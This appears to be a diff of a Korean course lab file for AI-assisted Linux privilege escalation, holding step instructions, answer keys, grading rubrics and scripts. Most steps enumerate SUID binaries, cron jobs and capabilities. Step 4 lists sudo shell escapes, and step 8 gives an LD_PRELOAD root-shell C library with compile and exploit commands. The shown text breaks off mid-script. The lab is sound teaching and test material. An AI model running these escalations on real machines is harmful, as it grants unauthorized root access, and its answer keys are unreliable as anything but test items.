@@ -3,8 +3,8 @@ title: 권한 상승 체인 (AI 지원)
 version: ai
 course: attack-adv-ai
 week: 6
-description: Linux 시스템에서 초기 접근 권한으로부터 root 권한까지 다단계 권한 상승을 수행한다. SUID 바이너리, 커널 취약점,
-  sudo 오설정, cron 악용 등 다양한 권한 상승 벡터를 체이닝한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: Linux 시스템에서 초기 접근 권한으로부터 root 권한까지 다단계 권한 상승을 수행한다. SUID 바이너리, 커널 취약점, sudo 오설정, cron 악용 등 다양한 권한 상승 벡터를 체이닝한다. AI SubAgent가 
+  자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 120
 objectives:
@@ -14,26 +14,38 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한 수준을
-    확인하라.
+  instruction: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한 수준을 확인하라.
   hint: id, groups, sudo -l 명령으로 현재 권한과 사용 가능한 sudo 규칙을 확인한다
   category: recon
   points: 5
-  answer: '🤖 프롬프트: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한
-    수준을 확인해줘
+  answer: '🤖 프롬프트: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한 수준을 확인해줘
 
     📎 참고 (CLI): id && whoami && groups && sudo -l 2>&1 | head -20'
-  answer_detail: 권한 상승의 첫 단계는 현재 권한 수준을 파악하는 것이다. id 명령은 UID/GID와 소속 그룹을, sudo -l은
-    비밀번호 없이 실행 가능한 명령을 보여준다. docker, lxd, disk 그룹 소속은 그 자체로 root 획득이 가능한 경우가 많다.
+  answer_detail: 권한 상승의 첫 단계는 현재 권한 수준을 파악하는 것이다. id 명령은 UID/GID와 소속 그룹을, sudo -l은 비밀번호 없이 실행 가능한 명령을 보여준다. docker, lxd, disk 그룹 소속은 그 자체로 
+    root 획득이 가능한 경우가 많다.
   verify:
     type: output_contains
     expect: uid=
     field: stdout
+    semantic:
+      intent: 초기 접근 후 권한 상승 정찰의 1단계 — 현재 사용자의 UID/GID, 그룹 소속, sudo 권한 등 기본 권한 정보 수집
+      success_criteria:
+      - id 또는 whoami 실행 결과 (uid= 형식) 포함
+      - groups 명령 결과로 소속 그룹 나열
+      - sudo -l 실행 결과 해석 — 비밀번호 없이 가능한 명령 확인
+      acceptable_methods:
+      - id && whoami && groups && sudo -l 체인 실행
+      - python os.getuid/os.getgroups 로 동등 정보 수집
+      - linpeas.sh/linenum.sh 자동 열거 스크립트 결과 첫 구간
+      - Windows whoami /all 동등 명령 설명 (교차환경 대비)
+      negative_signs:
+      - id/whoami 중 하나만 (그룹·sudo 미확인)
+      - sudo -l 패스워드 필요로 실패하고 대체 없이 중단
+      - 로그인 실패·무응답만 출력
   target_vm: attacker
   script: id && whoami && groups && sudo -l 2>&1 | head -20
   risk_level: low
-  bastion_prompt: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한
-    수준을 확인해줘
+  bastion_prompt: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한 수준을 확인해줘
 - order: 2
   instruction: SUID 비트가 설정된 바이너리를 시스템 전체에서 검색하라. GTFOBins에서 활용 가능한 바이너리를 식별하라.
   hint: find / -perm -4000 -type f 명령으로 SUID 바이너리를 검색한다
@@ -42,134 +54,181 @@ steps:
   answer: '🤖 프롬프트: SUID 비트가 설정된 바이너리를 시스템 전체에서 검색하라. GTFOBins에서 활용 가능한 바이너리를 식별해줘
 
     📎 참고 (CLI): find / -perm -4000 -type f 2>/dev/null | head -20'
-  answer_detail: SUID(Set User ID) 비트가 설정된 바이너리는 소유자(보통 root) 권한으로 실행된다. find, vim,
-    nmap, python, bash 등에 SUID가 설정되어 있으면 GTFOBins(https://gtfobins.github.io)의 기법을
-    사용하여 root 셸을 획득할 수 있다. 비표준 SUID 바이너리는 특히 위험하다.
+  answer_detail: SUID(Set User ID) 비트가 설정된 바이너리는 소유자(보통 root) 권한으로 실행된다. find, vim, nmap, python, bash 등에 SUID가 설정되어 있으면 
+    GTFOBins(https://gtfobins.github.io)의 기법을 사용하여 root 셸을 획득할 수 있다. 비표준 SUID 바이너리는 특히 위험하다.
   verify:
     type: output_contains
     expect: /usr/
     field: stdout
+    semantic:
+      intent: SUID 비트 설정된 바이너리 전체 검색 — GTFOBins 에 등록된 exploitable 바이너리 식별
+      success_criteria:
+      - find / -perm -4000 -type f 2>/dev/null 명령 실행
+      - SUID 바이너리 목록 출력(/usr/bin/... 등 경로 최소 5 개 포함)
+      - GTFOBins 관점에서 exploitable 한 항목(vim/find/python/nmap 등) 언급 또는 식별
+      acceptable_methods:
+      - find / -perm -4000 -type f 직접 실행
+      - find / -perm -u+s -type f
+      - getcap 과 함께 병행 실행
+      - linpeas/linux-exploit-suggester 등 자동화 도구
+      negative_signs:
+      - SUID 대신 다른 권한(SGID/일반 권한)만 검색
+      - 검색 결과 없이 개념만 설명
+      - GTFOBins 활용 가능 바이너리 언급 누락
   target_vm: attacker
   script: find / -perm -4000 -type f 2>/dev/null | head -20
   risk_level: low
   bastion_prompt: SUID 비트가 설정된 바이너리를 시스템 전체에서 검색하라. GTFOBins에서 활용 가능한 바이너리를 식별해줘
 - order: 3
-  instruction: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를
-    수집하라.
+  instruction: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를 수집하라.
   hint: 커널 버전으로 DirtyCow, DirtyPipe 등 알려진 LPE 취약점을 검색한다
   category: recon
   points: 10
-  answer: '🤖 프롬프트: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로
-    정보를 수집해줘
+  answer: '🤖 프롬프트: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를 수집해줘
 
-    📎 참고 (CLI): uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel
-    LPE vulnerabilities:'' && echo ''CVE-2016-5195 DirtyCow: Linux < 4.8.3'' && echo
-    ''CVE-2022-0847 DirtyPipe: Linux 5.8 - 5.16.11'' && echo ''CVE-2021-4034 PwnKit:
-    polkit pkexec (any version)'' && echo ''CVE-2023-0386 OverlayFS: Linux < 6.2'''
-  answer_detail: 커널 취약점은 가장 강력한 권한 상승 벡터이다. 커널 버전을 확인한 후 exploit-db, searchsploit
-    등에서 매칭되는 LPE(Local Privilege Escalation) 취약점을 검색한다. DirtyCow(CVE-2016-5195), DirtyPipe(CVE-2022-0847),
-    PwnKit(CVE-2021-4034)은 광범위한 커널 버전에 영향을 미치는 대표적 취약점이다.
+    📎 참고 (CLI): uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel LPE vulnerabilities:'' && echo ''CVE-2016-5195 DirtyCow:
+    Linux < 4.8.3'' && echo ''CVE-2022-0847 DirtyPipe: Linux 5.8 - 5.16.11'' && echo ''CVE-2021-4034 PwnKit: polkit pkexec (any version)'' &&
+    echo ''CVE-2023-0386 OverlayFS: Linux < 6.2'''
+  answer_detail: 커널 취약점은 가장 강력한 권한 상승 벡터이다. 커널 버전을 확인한 후 exploit-db, searchsploit 등에서 매칭되는 LPE(Local Privilege Escalation) 취약점을 검색한다. 
+    DirtyCow(CVE-2016-5195), DirtyPipe(CVE-2022-0847), PwnKit(CVE-2021-4034)은 광범위한 커널 버전에 영향을 미치는 대표적 취약점이다.
   verify:
     type: output_contains
     expect: Linux
     field: stdout
+    semantic:
+      intent: 커널 버전 확인 및 알려진 LPE(DirtyCow/DirtyPipe/PwnKit 등) 취약점 매핑 조사
+      success_criteria:
+      - uname -a 또는 cat /proc/version 실행으로 커널 버전 노출
+      - DirtyCow/DirtyPipe/PwnKit/OverlayFS 중 2개 이상의 CVE ID + 영향 버전 언급
+      - 현재 커널이 특정 취약점 적용 범위에 해당하는지 해석
+      acceptable_methods:
+      - uname -a, cat /proc/version 출력
+      - lsb_release -a, hostnamectl 로 배포판 정보 병행
+      - searchsploit linux kernel <version>
+      - linux-exploit-suggester.sh 자동 매핑
+      negative_signs:
+      - 커널 버전 노출 없음
+      - 취약점 CVE 1개만 또는 영향 범위 없이 나열
+      - 우분투/데비안 패키지 버전 검색으로 오인 (커널 아님)
   target_vm: attacker
-  script: 'uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel LPE
-    vulnerabilities:'' && echo ''CVE-2016-5195 DirtyCow: Linux < 4.8.3'' && echo ''CVE-2022-0847
-    DirtyPipe: Linux 5.8 - 5.16.11'' && echo ''CVE-2021-4034 PwnKit: polkit pkexec
-    (any version)'' && echo ''CVE-2023-0386 OverlayFS: Linux < 6.2'''
+  script: 'uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel LPE vulnerabilities:'' && echo ''CVE-2016-5195 DirtyCow: Linux
+    < 4.8.3'' && echo ''CVE-2022-0847 DirtyPipe: Linux 5.8 - 5.16.11'' && echo ''CVE-2021-4034 PwnKit: polkit pkexec (any version)'' && echo ''CVE-2023-0386
+    OverlayFS: Linux < 6.2'''
   risk_level: low
-  bastion_prompt: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로
-    정보를 수집해줘
+  bastion_prompt: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를 수집해줘
 - order: 4
-  instruction: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find
-    등)의 활용법을 정리하라.
+  instruction: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을 정리하라.
   hint: GTFOBins의 sudo 섹션을 참고하여 셸 이스케이프 기법을 문서화한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find
-    등)의 활용법을 정리해줘
+  answer: '🤖 프롬프트: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을 정리해줘
 
-    📎 참고 (CLI): echo ''=== Sudo Shell Escape Techniques ==='' && echo '''' && echo
-    ''[vim] sudo vim -c ":!bash"'' && echo ''[less] sudo less /etc/hosts -> !bash''
-    && echo ''[find] sudo find / -name x -exec /bin/bash \;'' && echo ''[nmap] sudo
-    nmap --interactive -> !sh'' && echo ''[python] sudo python3 -c "import os;os.system("/bin/bash")"''
-    && echo ''[awk] sudo awk "BEGIN {system("/bin/bash")}"'' && echo ''[env] sudo
-    env /bin/bash'' && echo ''[man] sudo man man -> !bash'' && echo '''' && echo ''Current
-    sudo permissions:'' && sudo -l 2>&1 | tail -10'
-  answer_detail: sudo로 실행 가능한 프로그램 중 다수가 셸 이스케이프를 허용한다. vim은 :!bash, less는 !bash,
-    find는 -exec, python은 os.system() 등으로 root 셸을 획득할 수 있다. 이를 방지하려면 NOEXEC 태그를 사용하거나,
-    특정 명령의 인자까지 제한해야 한다.
+    📎 참고 (CLI): echo ''=== Sudo Shell Escape Techniques ==='' && echo '''' && echo ''[vim] sudo vim -c ":!bash"'' && echo ''[less] sudo less /etc/hosts
+    -> !bash'' && echo ''[find] sudo find / -name x -exec /bin/bash \;'' && echo ''[nmap] sudo nmap --interactive -> !sh'' && echo ''[python]
+    sudo python3 -c "import os;os.system("/bin/bash")"'' && echo ''[awk] sudo awk "BEGIN {system("/bin/bash")}"'' && echo ''[env] sudo env /bin/bash''
+    && echo ''[man] sudo man man -> !bash'' && echo '''' && echo ''Current sudo permissions:'' && sudo -l 2>&1 | tail -10'
+  answer_detail: sudo로 실행 가능한 프로그램 중 다수가 셸 이스케이프를 허용한다. vim은 :!bash, less는 !bash, find는 -exec, python은 os.system() 등으로 root 셸을 획득할 수 있다. 이를 
+    방지하려면 NOEXEC 태그를 사용하거나, 특정 명령의 인자까지 제한해야 한다.
   verify:
     type: output_contains
     expect: Sudo Shell Escape
     field: stdout
+    semantic:
+      intent: sudo 오설정을 이용한 셸 이스케이프 — vim/less/find/nmap/python 등 GTFOBins 기법 정리
+      success_criteria:
+      - sudo 로 실행 가능한 프로그램별 셸 이스케이프 명령 (vim :!bash, less !bash, find -exec 등) 3개 이상 제시
+      - sudo -l 실행으로 현재 환경의 실제 sudo 권한 확인
+      - GTFOBins 개념(SUID/sudo 에서 합법 바이너리로 root 셸 획득) 언급
+      acceptable_methods:
+      - echo/heredoc 으로 기법 목록 작성 + sudo -l 실행
+      - linpeas 의 sudo 섹션 결과
+      - sudo_exec_bypass Metasploit 모듈 예시
+      - 실제 이스케이프 실행(vim :!bash 등)으로 root 확인
+      negative_signs:
+      - 셸 이스케이프 기법 1개만 나열
+      - GTFOBins 개념 언급 없음
+      - sudo 설정 파일(/etc/sudoers) 수정만 제시 (이미 root 필요)
   target_vm: attacker
-  script: echo '=== Sudo Shell Escape Techniques ===' && echo '' && echo '[vim] sudo
-    vim -c ":!bash"' && echo '[less] sudo less /etc/hosts -> !bash' && echo '[find]
-    sudo find / -name x -exec /bin/bash \;' && echo '[nmap] sudo nmap --interactive
-    -> !sh' && echo '[python] sudo python3 -c "import os;os.system("/bin/bash")"'
-    && echo '[awk] sudo awk "BEGIN {system("/bin/bash")}"' && echo '[env] sudo env
-    /bin/bash' && echo '[man] sudo man man -> !bash' && echo '' && echo 'Current sudo
-    permissions:' && sudo -l 2>&1 | tail -10
+  script: echo '=== Sudo Shell Escape Techniques ===' && echo '' && echo '[vim] sudo vim -c ":!bash"' && echo '[less] sudo less /etc/hosts 
+    -> !bash' && echo '[find] sudo find / -name x -exec /bin/bash \;' && echo '[nmap] sudo nmap --interactive -> !sh' && echo '[python] sudo
+    python3 -c "import os;os.system("/bin/bash")"' && echo '[awk] sudo awk "BEGIN {system("/bin/bash")}"' && echo '[env] sudo env /bin/bash'
+    && echo '[man] sudo man man -> !bash' && echo '' && echo 'Current sudo permissions:' && sudo -l 2>&1 | tail -10
   risk_level: medium
-  bastion_prompt: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find
-    등)의 활용법을 정리해줘
+  bastion_prompt: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을 정리해줘
 - order: 5
-  instruction: cron 작업에서 권한 상승 벡터를 찾아라. 시스템 crontab과 사용자 crontab을 검사하고, 월드 writable
-    스크립트를 참조하는 항목을 식별하라.
+  instruction: cron 작업에서 권한 상승 벡터를 찾아라. 시스템 crontab과 사용자 crontab을 검사하고, 월드 writable 스크립트를 참조하는 항목을 식별하라.
   hint: cat /etc/crontab, ls -la /etc/cron.d/, crontab -l 등으로 스케줄된 작업을 확인한다
   category: recon
   points: 10
   answer: '🤖 프롬프트: cron 작업에서 권한 상승 벡터를 찾아라해줘
 
-    📎 참고 (CLI): echo ''=== Cron Jobs ==='' && cat /etc/crontab 2>/dev/null && echo
-    ''---'' && ls -la /etc/cron.d/ 2>/dev/null && echo ''---'' && ls -la /etc/cron.daily/
-    2>/dev/null | head -10 && echo ''---'' && echo ''World-writable scripts referenced
-    by cron:'' && find /etc/cron* -type f -exec grep -l ''/'' {} \; 2>/dev/null |
-    head -5'
-  answer_detail: cron 작업이 월드 writable 스크립트를 실행하면, 공격자가 스크립트를 수정하여 root 권한으로 코드를 실행할
-    수 있다. PATH 변수 조작(cron의 PATH에 공격자 디렉토리를 추가)이나 와일드카드 인젝션(tar * → --checkpoint 옵션
-    삽입)도 가능하다.
+    📎 참고 (CLI): echo ''=== Cron Jobs ==='' && cat /etc/crontab 2>/dev/null && echo ''---'' && ls -la /etc/cron.d/ 2>/dev/null && echo ''---''
+    && ls -la /etc/cron.daily/ 2>/dev/null | head -10 && echo ''---'' && echo ''World-writable scripts referenced by cron:'' && find /etc/cron*
+    -type f -exec grep -l ''/'' {} \; 2>/dev/null | head -5'
+  answer_detail: cron 작업이 월드 writable 스크립트를 실행하면, 공격자가 스크립트를 수정하여 root 권한으로 코드를 실행할 수 있다. PATH 변수 조작(cron의 PATH에 공격자 디렉토리를 추가)이나 와일드카드 
+    인젝션(tar * → --checkpoint 옵션 삽입)도 가능하다.
   verify:
     type: output_contains
     expect: Cron
     field: stdout
+    semantic:
+      intent: cron 작업 기반 권한 상승 벡터 탐색 — 시스템/사용자 crontab 및 /etc/cron.* 에서 world-writable 스크립트 참조 식별
+      success_criteria:
+      - /etc/crontab 출력 또는 ls /etc/cron.d/, /etc/cron.daily/ 등 결과
+      - world-writable 파일 또는 PATH 변조 가능 항목 탐색 (find + grep 조합)
+      - cron 관련 LPE 벡터(PATH 하이재킹, 와일드카드 인젝션, writable 스크립트) 최소 1 개 설명
+      acceptable_methods:
+      - cat /etc/crontab + ls -la /etc/cron.* 조합
+      - crontab -l (사용자 본인)
+      - linpeas 의 cron 섹션
+      - systemctl list-timers (systemd 타이머 대체)
+      negative_signs:
+      - crontab 이 없어서 아무것도 출력 안함 (대체 조사 없음)
+      - 권한 상승 벡터 분석 없이 단순 파일 목록만
+      - systemd 전용 환경에서 cron 만 찾고 타이머 미언급
   target_vm: attacker
-  script: echo '=== Cron Jobs ===' && cat /etc/crontab 2>/dev/null && echo '---' &&
-    ls -la /etc/cron.d/ 2>/dev/null && echo '---' && ls -la /etc/cron.daily/ 2>/dev/null
-    | head -10 && echo '---' && echo 'World-writable scripts referenced by cron:'
-    && find /etc/cron* -type f -exec grep -l '/' {} \; 2>/dev/null | head -5
+  script: echo '=== Cron Jobs ===' && cat /etc/crontab 2>/dev/null && echo '---' && ls -la /etc/cron.d/ 2>/dev/null && echo '---' && ls -la 
+    /etc/cron.daily/ 2>/dev/null | head -10 && echo '---' && echo 'World-writable scripts referenced by cron:' && find /etc/cron* -type f 
+    -exec grep -l '/' {} \; 2>/dev/null | head -5
   risk_level: low
   bastion_prompt: cron 작업에서 권한 상승 벡터를 찾아라해줘
 - order: 6
-  instruction: Linux capabilities를 통한 권한 상승을 검색하라. getcap으로 특수 capabilities가 설정된 바이너리를
-    찾아라.
+  instruction: Linux capabilities를 통한 권한 상승을 검색하라. getcap으로 특수 capabilities가 설정된 바이너리를 찾아라.
   hint: getcap -r / 명령으로 시스템 전체의 capabilities를 검색한다
   category: recon
   points: 10
-  answer: '🤖 프롬프트: Linux capabilities(cap_setuid, cap_dac_override, cap_net_raw 등)를
-    통한 권한 상승 기법과 getcap 명령으로 위험한 바이너리를 식별하는 방법을 설명해줘
+  answer: '🤖 프롬프트: Linux capabilities(cap_setuid, cap_dac_override, cap_net_raw 등)를 통한 권한 상승 기법과 getcap 명령으로 위험한 바이너리를 식별하는 방법을 설명해줘
 
-    📎 참고 (CLI): getcap -r / 2>/dev/null | head -20 && echo ''---'' && echo ''Dangerous
-    capabilities:'' && echo ''cap_setuid -> Change UID to root'' && echo ''cap_dac_override
-    -> Bypass file permission checks'' && echo ''cap_sys_admin -> Mount filesystems,
-    debug processes'' && echo ''cap_net_raw -> Raw socket access (packet sniffing)'''
-  answer_detail: Linux Capabilities는 root 권한을 세분화한 것이다. cap_setuid+ep가 설정된 python은
-    os.setuid(0)으로 root가 되고, cap_dac_override는 모든 파일을 읽을 수 있다. SUID보다 잘 알려지지 않아 관리자가
-    간과하는 경우가 많다.
+    📎 참고 (CLI): getcap -r / 2>/dev/null | head -20 && echo ''---'' && echo ''Dangerous capabilities:'' && echo ''cap_setuid -> Change UID to root''
+    && echo ''cap_dac_override -> Bypass file permission checks'' && echo ''cap_sys_admin -> Mount filesystems, debug processes'' && echo ''cap_net_raw
+    -> Raw socket access (packet sniffing)'''
+  answer_detail: Linux Capabilities는 root 권한을 세분화한 것이다. cap_setuid+ep가 설정된 python은 os.setuid(0)으로 root가 되고, cap_dac_override는 모든 파일을 읽을 수 
+    있다. SUID보다 잘 알려지지 않아 관리자가 간과하는 경우가 많다.
   verify:
     type: output_contains
     expect: cap_
     field: stdout
+    semantic:
+      intent: Linux capabilities 기반 권한 상승 — getcap 로 cap_setuid/cap_dac_override 등 위험 capability 설정된 바이너리 식별
+      success_criteria:
+      - getcap -r / 2>/dev/null 실행 또는 동등 명령
+      - cap_setuid/cap_dac_override/cap_sys_admin/cap_net_raw 중 2 개 이상 설명
+      - capability 가 SUID 보다 세분화된 권한이며 관리자가 간과한다는 포인트 언급
+      acceptable_methods:
+      - getcap -r / 직접 실행
+      - find / -type f -exec getcap {} + 2>/dev/null
+      - python 으로 os.cap_* 검사 스크립트
+      - linpeas 의 capabilities 섹션
+      negative_signs:
+      - SUID 만 검색하고 capability 생략
+      - getcap 명령 없이 capability 이론만 설명
+      - 위험 capability 구분 없이 cap_ 문자열만 매치
   target_vm: attacker
-  script: getcap -r / 2>/dev/null | head -20 && echo '---' && echo 'Dangerous capabilities:'
-    && echo 'cap_setuid -> Change UID to root' && echo 'cap_dac_override -> Bypass
-    file permission checks' && echo 'cap_sys_admin -> Mount filesystems, debug processes'
-    && echo 'cap_net_raw -> Raw socket access (packet sniffing)'
+  script: getcap -r / 2>/dev/null | head -20 && echo '---' && echo 'Dangerous capabilities:' && echo 'cap_setuid -> Change UID to root' && 
+    echo 'cap_dac_override -> Bypass file permission checks' && echo 'cap_sys_admin -> Mount filesystems, debug processes' && echo 
+    'cap_net_raw -> Raw socket access (packet sniffing)'
   risk_level: low
-  bastion_prompt: Linux capabilities(cap_setuid, cap_dac_override, cap_net_raw 등)를
-    통한 권한 상승 기법과 getcap 명령으로 위험한 바이너리를 식별하는 방법을 설명해줘
+  bastion_prompt: Linux capabilities(cap_setuid, cap_dac_override, cap_net_raw 등)를 통한 권한 상승 기법과 getcap 명령으로 위험한 바이너리를 식별하는 방법을 설명해줘
 - order: 7
   instruction: 월드 writable 파일과 디렉토리를 검색하라. 특히 /etc 하위의 쓰기 가능한 설정 파일을 찾아라.
   hint: find / -writable -type f 명령으로 쓰기 가능한 파일을 검색한다
@@ -177,23 +236,34 @@ steps:
   points: 10
   answer: '🤖 프롬프트: 월드 writable 파일과 디렉토리를 검색해줘
 
-    📎 참고 (CLI): find /etc -writable -type f 2>/dev/null | head -10 && echo ''---''
-    && find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -10
-    && echo ''---'' && echo ''Writable /etc/passwd -> add root user'' && echo ''Writable
-    /etc/shadow -> replace root hash'' && echo ''Writable /etc/sudoers -> grant sudo
-    access'''
-  answer_detail: 월드 writable 설정 파일은 치명적인 권한 상승 벡터이다. /etc/passwd에 쓸 수 있으면 UID 0인 새
-    사용자를 추가할 수 있고(openssl passwd로 해시 생성), /etc/sudoers에 쓸 수 있으면 자신에게 sudo ALL 권한을
-    부여할 수 있다. /etc/ld.so.conf에 쓰면 LD preload 공격이 가능하다.
+    📎 참고 (CLI): find /etc -writable -type f 2>/dev/null | head -10 && echo ''---'' && find / -writable -type d 2>/dev/null | grep -v proc | grep
+    -v sys | head -10 && echo ''---'' && echo ''Writable /etc/passwd -> add root user'' && echo ''Writable /etc/shadow -> replace root hash''
+    && echo ''Writable /etc/sudoers -> grant sudo access'''
+  answer_detail: 월드 writable 설정 파일은 치명적인 권한 상승 벡터이다. /etc/passwd에 쓸 수 있으면 UID 0인 새 사용자를 추가할 수 있고(openssl passwd로 해시 생성), /etc/sudoers에 쓸 수 
+    있으면 자신에게 sudo ALL 권한을 부여할 수 있다. /etc/ld.so.conf에 쓰면 LD preload 공격이 가능하다.
   verify:
     type: output_contains
     expect: writable
     field: stdout
+    semantic:
+      intent: world-writable 파일/디렉토리 검색 — 특히 /etc 하위의 writable 설정 파일을 식별해 권한 상승 경로 파악
+      success_criteria:
+      - find / -writable 또는 find /etc -writable 명령 실행
+      - /etc/passwd, /etc/shadow, /etc/sudoers 등 민감 파일 writable 여부 확인 논리
+      - writable 설정 파일 별 공격 벡터(UID 0 사용자 추가, sudo ALL 부여 등) 언급
+      acceptable_methods:
+      - find / -writable -type f 2>/dev/null
+      - find / -perm -222 -type f (모두에게 쓰기)
+      - ls -la 로 특정 중요 파일 권한 확인
+      - stat 명령 반복
+      negative_signs:
+      - world-writable 만 검색하고 분석 없음
+      - /etc 외 검색만 (민감 설정 파일 언급 없음)
+      - LD_PRELOAD/ld.so.conf 등 설정 파일 위험 연결 부재
   target_vm: attacker
-  script: find /etc -writable -type f 2>/dev/null | head -10 && echo '---' && find
-    / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -10 && echo
-    '---' && echo 'Writable /etc/passwd -> add root user' && echo 'Writable /etc/shadow
-    -> replace root hash' && echo 'Writable /etc/sudoers -> grant sudo access'
+  script: find /etc -writable -type f 2>/dev/null | head -10 && echo '---' && find / -writable -type d 2>/dev/null | grep -v proc | grep -v 
+    sys | head -10 && echo '---' && echo 'Writable /etc/passwd -> add root user' && echo 'Writable /etc/shadow -> replace root hash' && echo
+    'Writable /etc/sudoers -> grant sudo access'
   risk_level: low
   bastion_prompt: 월드 writable 파일과 디렉토리를 검색해줘
 - order: 8
@@ -201,63 +271,77 @@ steps:
   hint: init() 함수에서 setuid(0)과 system("/bin/bash")을 호출하는 .c 파일을 작성한다
   category: exploit
   points: 10
-  answer: "\U0001F916 프롬프트: LD_PRELOAD를 활용한 권한 상승 기법을 시뮬레이션하라 구현 방법과 예시를 설명해줘\n\U0001F4CE\
-    \ 참고 (CLI): cat > /tmp/preload.c << 'CEOF'\n#include <stdio.h>\n#include <sys/types.h>\n\
-    #include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0,\
-    \ 0, 0);\n    system(\"/bin/bash -p\");\n}\nCEOF\ncat /tmp/preload.c && echo ''\
-    \ && echo '=== Compile & Exploit ===' && echo 'gcc -fPIC -shared -nostartfiles\
-    \ -o /tmp/preload.so /tmp/preload.c' && echo 'sudo LD_PRELOAD=/tmp/preload.so\
-    \ <allowed_command>' && echo '' && echo 'Requires: sudo with env_keep+=LD_PRELOAD\
-    \ or NOPASSWD command'"
-  answer_detail: LD_PRELOAD는 프로그램 실행 시 지정된 공유 라이브러리를 먼저 로드한다. sudo가 env_keep에 LD_PRELOAD를
-    허용하면, _init() 함수에서 root 셸을 실행하는 라이브러리를 로드할 수 있다. 대부분의 현대 sudo는 이를 차단하지만, 특수 설정
-    환경에서는 여전히 유효하다.
+  answer: "🤖 프롬프트: LD_PRELOAD를 활용한 권한 상승 기법을 시뮬레이션하라 구현 방법과 예시를 설명해줘\n📎 참고 (CLI): cat > /tmp/preload.c << 'CEOF'\n#include <stdio.h>\n#include
+    <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0, 0, 0);\n    system(\"/bin/bash -p\"\
+    );\n}\nCEOF\ncat /tmp/preload.c && echo '' && echo '=== Compile & Exploit ===' && echo 'gcc -fPIC -shared -nostartfiles -o /tmp/preload.so
+    /tmp/preload.c' && echo 'sudo LD_PRELOAD=/tmp/preload.so <allowed_command>' && echo '' && echo 'Requires: sudo with env_keep+=LD_PRELOAD or
+    NOPASSWD command'"
+  answer_detail: LD_PRELOAD는 프로그램 실행 시 지정된 공유 라이브러리를 먼저 로드한다. sudo가 env_keep에 LD_PRELOAD를 허용하면, _init() 함수에서 root 셸을 실행하는 라이브러리를 로드할 수 있다. 
+    대부분의 현대 sudo는 이를 차단하지만, 특수 설정 환경에서는 여전히 유효하다.
   verify:
     type: output_contains
     expect: LD_PRELOAD
     field: stdout
+    semantic:
+      intent: LD_PRELOAD 공격 — sudo env_keep 에 LD_PRELOAD 가 포함된 경우 _init() 에서 setresuid+system 호출하는 공유 라이브러리 작성
+      success_criteria:
+      - _init() 내부에 setresuid(0,0,0) 또는 setuid(0) 호출 포함
+      - system("/bin/bash -p") 또는 execve 로 셸 실행
+      - gcc -fPIC -shared -nostartfiles -o preload.so preload.c 컴파일 명령 제시
+      - sudo LD_PRELOAD=/tmp/preload.so <cmd> 형태의 exploit 구문 노출
+      acceptable_methods:
+      - heredoc 으로 .c 파일 작성 + gcc 컴파일 + 실행 명령
+      - nim/rust 로 동등 .so 작성
+      - 기존 libc 래퍼를 악용하는 LD_LIBRARY_PATH 변형
+      - sudo env_keep+=LD_PRELOAD 전제 조건 설명 포함
+      negative_signs:
+      - _init 없는 일반 .so (자동 실행 안 됨)
+      - setuid 호출 누락
+      - 컴파일 명령이나 실행 exploit 경로 누락
   target_vm: attacker
-  script: "cat > /tmp/preload.c << 'CEOF'\n#include <stdio.h>\n#include <sys/types.h>\n\
-    #include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0,\
-    \ 0, 0);\n    system(\"/bin/bash -p\");\n}\nCEOF\ncat /tmp/preload.c && echo ''\
-    \ && echo '=== Compile & Exploit ===' && echo 'gcc -fPIC -shared -nostartfiles\
-    \ -o /tmp/preload.so /tmp/preload.c' && echo 'sudo LD_PRELOAD=/tmp/preload.so\
-    \ <allowed_command>' && echo '' && echo 'Requires: sudo with env_keep+=LD_PRELOAD\
-    \ or NOPASSWD command'"
+  script: "cat > /tmp/preload.c << 'CEOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"\
